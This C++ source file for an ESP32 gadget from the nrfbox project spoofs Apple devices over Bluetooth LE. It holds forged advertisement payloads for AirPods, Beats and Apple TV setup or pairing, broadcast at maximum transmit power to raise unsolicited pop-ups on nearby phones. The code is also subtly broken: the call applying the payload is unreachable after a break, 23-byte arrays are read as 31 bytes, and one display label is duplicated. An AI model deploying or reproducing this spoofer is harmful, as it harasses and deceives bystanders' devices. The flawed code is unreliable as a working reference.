/* ____________________________
   This software is licensed under the MIT License:
   https://github.com/cifertech/nrfbox
   ________________________________________ */
   
#include <Arduino.h> 
#include "spoofer.h"

extern U8G2_SSD1306_128X64_NONAME_F_HW_I2C u8g2;

BLEAdvertising *pAdvertising;  

const int deviceTypeNextPin = 26; 
const int deviceTypePrevPin = 33; 
const int advTypeNextPin = 25;    
//const int advTypePrevPin = 27;    
const int advControlPin = 27;     

unsigned long lastDebounceTimeNext = 0;
unsigned long lastDebounceTimePrev = 0;
unsigned long lastDebounceTimeAdvNext = 0;
unsigned long lastDebounceTimeAdvPrev = 0;

int lastButtonStateNext = LOW;
int lastButtonStatePrev = LOW;
int lastButtonStateAdvNext = LOW;
int lastButtonStateAdvPrev = LOW;


unsigned long lastDebounceTime = 0;
unsigned long debounceDelay = 500; 

bool isAdvertising = true; 

int deviceType = 1; 
int delaySeconds = 1;
int advType = 1; 

    // Payload data
  uint8_t dataAirpods[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};  
  uint8_t dataAirpodsPro[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0e, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
  uint8_t dataAirpodsMax[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0a, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
  uint8_t dataAirpodsGen2[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0f, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
  uint8_t dataAirpodsGen3[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x13, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
  uint8_t dataAirpodsProGen2[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x14, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
  uint8_t dataPowerBeats[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x03, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
  uint8_t dataPowerBeatsPro[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0b, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
  uint8_t dataBeatsSoloPro[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0c, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
  uint8_t dataBeatsStudioBuds[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x11, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
  uint8_t dataBeatsFlex[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x10, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}; 
  uint8_t dataBeatsX[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x05, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
  uint8_t dataBeatsSolo3[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x06, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
  uint8_t dataBeatsStudio3[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x09, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
  uint8_t dataBeatsStudioPro[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x17, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
  uint8_t dataBeatsFitPro[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x12, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
  uint8_t dataBeatsStudioBudsPlus[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x16, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
  uint8_t dataAppleTVSetup[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x01, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
  uint8_t dataAppleTVPair[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x06, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
  uint8_t dataAppleTVNewUser[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x20, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
  uint8_t dataAppleTVAppleIDSetup[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x2b, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
  uint8_t dataAppleTVWirelessAudioSync[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0xc0, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
  uint8_t dataAppleTVHomekitSetup[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x0d, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
  uint8_t dataAppleTVKeyboard[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x13, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
  uint8_t dataAppleTVConnectingToNetwork[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x27, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
  uint8_t dataHomepodSetup[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x0b, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
  uint8_t dataSetupNewPhone[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x09, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
  uint8_t dataTransferNumber[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x02, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
  uint8_t dataTVColorBalance[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x1e, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};


void updateDisplay() {
  u8g2.clearBuffer(); 

    // Display device type
  u8g2.setFont(u8g2_font_profont11_tf);
  u8g2.drawStr(0, 10, "Device:");
  int x = 0;
  int y = 25;
  

  switch (deviceType) {
    case 1:
        u8g2.drawStr(x, y, "[ Airpods ]");
        break;
    case 2:
        u8g2.drawStr(x, y, "[ Airpods Pro ]");
        break;
    case 3:
        u8g2.drawStr(x, y, "[ Airpods Max ]");
        break;
    case 4:
        u8g2.drawStr(x, y, "[ Airpods Gen 2 ]");
        break;
    case 5:
        u8g2.drawStr(x, y, "[ Airpods Gen 3 ]");
        break;
    case 6:
        u8g2.drawStr(x, y, "[ Airpods Gen 2 ]");
        break;
    case 7:
        u8g2.drawStr(x, y, "[ PowerBeats ]");
        break;
    case 8:
        u8g2.drawStr(x, y, "[ PowerBeats Pro ]");
        break;
    case 9:
        u8g2.drawStr(x, y, "[ Beats Solo Pro ]");
        break;
    case 10:
        u8g2.drawStr(x, y, "[ Beats Buds ]");
        break;
    case 11:
        u8g2.drawStr(x, y, "[ Beats Flex ]");
        break;
    case 12:
        u8g2.drawStr(x, y, "[ BeatsX ]");
        break;
    case 13:
        u8g2.drawStr(x, y, "[ Beats Solo3 ]");
        break;
    case 14:
        u8g2.drawStr(x, y, "[ Beats Studio3 ]");
        break;
    case 15:
        u8g2.drawStr(x, y, "[ Beats StudioPro ]");
        break;
    case 16:
        u8g2.drawStr(x, y, "[ Beats FitPro ]");
        break;
    case 17:
        u8g2.drawStr(x, y, "[ Beats BudsPlus ]");
        break;
    case 18:
        u8g2.drawStr(x, y, "[ AppleTV Setup ]");
        break;
    case 19:
        u8g2.drawStr(x, y, "[ AppleTV Pair ]");
        break;
    case 20:
        u8g2.drawStr(x, y, "[ AppleTV NewUser ]");
        break;
    case 21:
        u8g2.drawStr(x, y, "[ AppleTV ID ]");
        break;
    case 22:
        u8g2.drawStr(x, y, "[ AppleTV Audio ]");
        break;
    case 23:
        u8g2.drawStr(x, y, "[ AppleTV Homekit ]");
        break;
    case 24:
        u8g2.drawStr(x, y, "[ AppleTV Keyboard ]");
        break;
    case 25:
        u8g2.drawStr(x, y, "[ AppleTV Network ]");
        break;    
    case 26:
        u8g2.drawStr(x, y, "[ TVColorBalance ]");
        break;                   
    default:
        u8g2.drawStr(x, y, "[ Airpods ]");
        break;
}

  u8g2.drawStr(0, 45, "Adv Type:");

  switch (advType) {
    case 1:
        u8g2.drawStr(60, 45, "IND");
        break;
    case 2:
        u8g2.drawStr(60, 45, "DIRECT HIGH");
        break;
    case 3:
        u8g2.drawStr(60, 45, "SCAN");
        break;
    case 4:
        u8g2.drawStr(60, 45, "NONCONN");
        break;
    case 5:
        u8g2.drawStr(60, 45, "DIRECT LOW");
        break;
  }

  u8g2.drawStr(0, 64, "Advertising:");
  u8g2.setCursor(80, 64);
  u8g2.print(isAdvertising ? "Disable" : "Active");

  u8g2.sendBuffer(); 
}

void setAdvertisingData() {
  BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();

switch (deviceType) {
  case 1:
    oAdvertisementData.setManufacturerData(std::string((char *)dataAirpods, 31));
    break;
  case 2:
    oAdvertisementData.setManufacturerData(std::string((char *)dataAirpodsPro, 31));
    break;
  case 3:
    oAdvertisementData.setManufacturerData(std::string((char *)dataAirpodsMax, 31));
    break;
  case 4:
    oAdvertisementData.setManufacturerData(std::string((char *)dataAirpodsGen2, 31));
    break;
  case 5:
    oAdvertisementData.setManufacturerData(std::string((char *)dataAirpodsGen3, 31));
    break;
  case 6:
    oAdvertisementData.setManufacturerData(std::string((char *)dataAirpodsProGen2, 31));
    break;
  case 7:
    oAdvertisementData.setManufacturerData(std::string((char *)dataPowerBeats, 31));
    break;
  case 8:
    oAdvertisementData.setManufacturerData(std::string((char *)dataPowerBeatsPro, 31));
    break;
  case 9:
    oAdvertisementData.setManufacturerData(std::string((char *)dataBeatsSoloPro, 31));
    break;
  case 10:
    oAdvertisementData.setManufacturerData(std::string((char *)dataBeatsStudioBuds, 31));
    break;
  case 11:
    oAdvertisementData.setManufacturerData(std::string((char *)dataBeatsFlex, 31));
    break;
  case 12:
    oAdvertisementData.setManufacturerData(std::string((char *)dataBeatsX, 31));
    break;
  case 13:
    oAdvertisementData.setManufacturerData(std::string((char *)dataBeatsSolo3, 31));
    break;
  case 14:
    oAdvertisementData.setManufacturerData(std::string((char *)dataBeatsStudio3, 31));
    break;
  case 15:
    oAdvertisementData.setManufacturerData(std::string((char *)dataBeatsStudioPro, 31));
    break;
  case 16:
    oAdvertisementData.setManufacturerData(std::string((char *)dataBeatsFitPro, 31));
    break;
  case 17:
    oAdvertisementData.setManufacturerData(std::string((char *)dataBeatsStudioBudsPlus, 31));
    break;
  case 18:
    oAdvertisementData.setManufacturerData(std::string((char *)dataAppleTVSetup, 31));
    break;
  case 19:
    oAdvertisementData.setManufacturerData(std::string((char *)dataAppleTVPair, 31));
    break;
  case 20:
    oAdvertisementData.setManufacturerData(std::string((char *)dataAppleTVNewUser, 31));
    break;
  case 21:
    oAdvertisementData.setManufacturerData(std::string((char *)dataAppleTVAppleIDSetup, 31));
    break;
  case 22:
    oAdvertisementData.setManufacturerData(std::string((char *)dataAppleTVWirelessAudioSync, 31));
    break;
  case 23:
    oAdvertisementData.setManufacturerData(std::string((char *)dataAppleTVHomekitSetup, 31));
    break;
  case 24:
    oAdvertisementData.setManufacturerData(std::string((char *)dataAppleTVKeyboard, 31));
    break;
  case 25:
    oAdvertisementData.setManufacturerData(std::string((char *)dataAppleTVConnectingToNetwork, 31));
    break;
  case 26:
    oAdvertisementData.setManufacturerData(std::string((char *)dataTVColorBalance, 31));
    break;
  default:
    oAdvertisementData.setManufacturerData(std::string((char *)dataAirpods, 31)); 
    break;

  pAdvertising->setAdvertisementData(oAdvertisementData);
  Serial.println("Advertising data set.");
  updateDisplay();
  }
}

void handleButtonPress(int pin, void (*callback)()) {
  int reading = digitalRead(pin);

  if (reading == LOW) {  
    unsigned long currentTime = millis();
    delay(300);
    updateDisplay();

    if ((currentTime - lastDebounceTime) > debounceDelay) {
      callback();
      lastDebounceTime = currentTime;
    }
  }
}

void changeDeviceTypeNext() {
  deviceType++;
  if (deviceType > 26) deviceType = 1;
  Serial.println("Device Type Next: " + String(deviceType));
  setAdvertisingData();
  updateDisplay();
}

void changeDeviceTypePrev() {
  deviceType--;
  if (deviceType < 1) deviceType = 26;
  Serial.println("Device Type Prev: " + String(deviceType));
  setAdvertisingData();
  updateDisplay();
}

void changeAdvTypeNext() {
  advType++;
  if (advType > 5) advType = 1;
  Serial.println("Advertising Type Next: " + String(advType));
  setAdvertisingData();
  updateDisplay();
}

void changeAdvTypePrev() {
  advType--;
  if (advType < 1) advType = 5;
  Serial.println("Advertising Type Prev: " + String(advType));
  setAdvertisingData();
  updateDisplay();
}

void toggleAdvertising() {
  if (isAdvertising) {
    pAdvertising->stop();
    Serial.println("Advertising stopped.");
    updateDisplay();
  } else {
    pAdvertising->start();
    Serial.println("Advertising started.");
    updateDisplay();
  }
  isAdvertising = !isAdvertising;  
}


void spooferSetup(){
  
  Serial.begin(115200);
  Serial.println("Starting ESP32 BLE");

  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9); //This should increase transmitting power to 9dBm
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9); //Not sure if this works with NimBLE
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_SCAN ,ESP_PWR_LVL_P9);

  u8g2.begin();
  updateDisplay();

  BLEDevice::init("");

  BLEServer *pServer = BLEDevice::createServer();

  pAdvertising = pServer->getAdvertising();
  BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();

  pinMode(deviceTypeNextPin, INPUT_PULLUP);
  pinMode(deviceTypePrevPin, INPUT_PULLUP);
  pinMode(advTypeNextPin, INPUT_PULLUP);
  //pinMode(advTypePrevPin, INPUT_PULLUP);
  pinMode(advControlPin, INPUT_PULLUP);
}

void spooferLoop(){

  handleButtonPress(deviceTypeNextPin, changeDeviceTypeNext);
  handleButtonPress(deviceTypePrevPin, changeDeviceTypePrev);
  handleButtonPress(advTypeNextPin, changeAdvTypeNext);
  //handleButtonPress(advTypePrevPin, changeAdvTypePrev);
  handleButtonPress(advControlPin, toggleAdvertising); 
  
}
